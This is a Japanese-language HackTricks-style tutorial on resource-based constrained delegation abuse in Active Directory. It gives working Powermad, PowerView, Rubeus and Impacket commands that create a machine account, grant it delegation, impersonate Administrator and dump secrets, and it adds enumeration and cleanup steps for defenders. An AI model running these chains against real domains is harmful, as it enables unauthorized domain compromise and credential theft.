# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation の基本

これは基本的な [Constrained Delegation](constrained-delegation.md) に似ていますが、**オブジェクト**に**あるマシンに対して任意のユーザーをなりすます権限**を与える代わりに、Resource-based Constrain Delegation は**そのオブジェクトに対して誰が任意のユーザーをなりすませるかを設定します**。

この場合、制約されたオブジェクトは _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ という属性を持ち、その値にそのオブジェクトに対して任意のユーザーをなりすますことができるユーザーの名前が入ります。

この Constrained Delegation と他の delegation とのもう一つの重要な違いは、マシンアカウントに対する **write permissions** （_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_）を持つ任意のユーザーが **_msDS-AllowedToActOnBehalfOfOtherIdentity_** を設定できる点です（他の形式の Delegation ではドメイン管理者権限が必要でした）。

### 新しい概念

Constrained Delegation の説明では、ユーザーの _userAccountControl_ 値内の **`TrustedToAuthForDelegation`** フラグが **S4U2Self** を実行するために必要だとされていました。しかしそれは完全に正しくありません。実際には、その値がなくても、あなたが **service**（SPN を持つ）であれば任意のユーザーに対して **S4U2Self** を実行できます。ただし、**`TrustedToAuthForDelegation`** を**持っている**場合に返される TGS は **Forwardable** になり、持っていない場合は返される TGS は **Forwardable** にはなりません。

しかし、**S4U2Proxy** で使用される **TGS** が **NOT Forwardable** の場合、基本的な Constrain Delegation を悪用しようとしてもうまくいきません。しかし Resource-Based constrain delegation を悪用する場合は動作します。

### 攻撃の流れ

> もし**Computer**アカウントに対して**write equivalent privileges**を持っていれば、そのマシン上で**特権的アクセス**を取得できます。

攻撃者が既に **victim computer** に対して **write equivalent privileges** を持っていると仮定します。

1. 攻撃者は **SPN** を持つアカウントを**侵害**するか、**作成**します（“Service A”）。追加の特権がない **_Admin User_** であっても最大 10 個まで Computer objects（**_MachineAccountQuota_**）を作成して SPN を設定できる点に注意してください。したがって攻撃者は単に Computer オブジェクトを作成して SPN を設定できます。
2. 攻撃者は被害者のコンピュータ（ServiceB）に対する WRITE 権限を**悪用し**、ServiceA がその被害者コンピュータ（ServiceB）に対して任意のユーザーをなりすますことを許可するように **resource-based constrained delegation** を構成します。
3. 攻撃者は Rubeus を使用して Service A から Service B への **full S4U attack**（S4U2Self と S4U2Proxy）を、Service B への特権アクセスを持つユーザーに対して実行します。
1. S4U2Self（SPN を侵害／作成したアカウントから）：**TGS of Administrator to me**（Not Forwardable）を要求します。
2. S4U2Proxy：前のステップで得た **not Forwardable TGS** を使って、**Administrator** から **victim host** への **TGS** を要求します。
3. not Forwardable な TGS を使用していても、Resource-based constrained delegation を悪用しているため動作します。
4. 攻撃者は **pass-the-ticket** を行い、ユーザーを **impersonate** して **victim ServiceB** へのアクセスを取得できます。

ドメインの _**MachineAccountQuota**_ を確認するには以下を使用できます：
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻撃

### コンピュータオブジェクトの作成

ドメイン内にコンピュータオブジェクトを作成するには、**[powermad](https://github.com/Kevin-Robertson/Powermad):** を使用できます。
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation の構成

**activedirectory PowerShell module を使用**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview を使用する**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Performing a complete S4U attack (Windows/Rubeus)

まず、新しい Computer オブジェクトをパスワード `123456` で作成したので、そのパスワードのハッシュが必要です:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
これにより、そのアカウントのRC4およびAESハッシュが出力されます。  
これでattackを実行できます:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus の `/altservice` パラメータを使えば、一度の要求で複数のサービスのチケットを生成できます:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> ユーザーには "**Cannot be delegated**" という属性がある点に注意してください。もしその属性が True に設定されているユーザーがいれば、そのユーザーをインパーソネートすることはできません。このプロパティは bloodhound 内で確認できます。

### Linux 環境: エンドツーエンドの RBCD を Impacket で実行する (2024+)

Linux から操作する場合、公式の Impacket ツールを使ってフルな RBCD チェーンを実行できます:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
注意
- LDAP signing/LDAPS が強制されている場合は、`impacket-rbcd -use-ldaps ...` を使用してください。
- AES keys を優先してください。多くの最新のドメインは RC4 を制限しています。Impacket と Rubeus はどちらも AES のみのフローをサポートします。
- Impacket は一部のツール向けに `sname` ("AnySPN") を書き換えることがありますが、可能な限り正しい SPN（例: CIFS/LDAP/HTTP/HOST/MSSQLSvc）を取得してください。

### アクセス

最後のコマンドラインは **complete S4U attack and will inject the TGS** を実行し、Administrator から被害ホストへ **memory** に注入します。\
この例では Administrator から **CIFS** サービスの TGS が要求されたため、**C$** にアクセスできるようになります:
```bash
ls \\victim.domain.local\C$
```
### 異なる service tickets の悪用

Learn about the [**available service tickets here**](silver-ticket.md#available-services).

## 列挙、監査、クリーンアップ

### RBCD が構成されたコンピューターの列挙

PowerShell (SD をデコードして SID を解決):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (read または flush を 1 コマンドで実行):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### クリーンアップ / リセット RBCD

- PowerShell (属性をクリア):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: これは kerberos が DES や RC4 を使用しないように構成されており、あなたが RC4 ハッシュしか渡していないことを意味します。Rubeus に最低でも AES256 ハッシュを渡すか（または rc4、aes128、aes256 のハッシュをすべて渡してください）。Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: これは現在のコンピュータの時刻が DC の時刻と異なり、kerberos が正しく動作していないことを意味します。
- **`preauth_failed`**: これは指定したユーザー名＋ハッシュではログインできないことを意味します。ハッシュ生成時にユーザー名に `$` を付け忘れている可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**: これは以下を意味する可能性があります:
- あなたがインパーソネートしようとしているユーザーが目的のサービスにアクセスできない（インパーソネートできないか、十分な権限がないため）
- 要求したサービスが存在しない（例: winrm のチケットを要求したが winrm が稼働していない場合）
- 作成した fakecomputer が脆弱なサーバーに対する権限を失っており、それらの権限を戻す必要がある
- 古典的な KCD を悪用している可能性がある。RBCD は non-forwardable S4U2Self チケットで動作するのに対し、KCD は forwardable を必要とすることを忘れないでください。

## Notes, relays and alternatives

- LDAP がフィルタリングされている場合、AD Web Services (ADWS) を介して RBCD SD を書き込むこともできます。See:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay チェーンは、ローカル SYSTEM を一段で取得するために RBCD で終了することが多いです。実践的なエンドツーエンドの例を参照:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding が **disabled** で、かつ機械アカウントを作成できる場合、**KrbRelayUp** のようなツールは強制された Kerberos 認証を LDAP にリレーし、ターゲットの computer オブジェクトに対して機械アカウントの `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定し、オフホストから S4U を使って直ちに **Administrator** をインパーソネートできます。

## References

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py（公式）: https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- 最近の構文を含む簡単な Linux チートシート: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
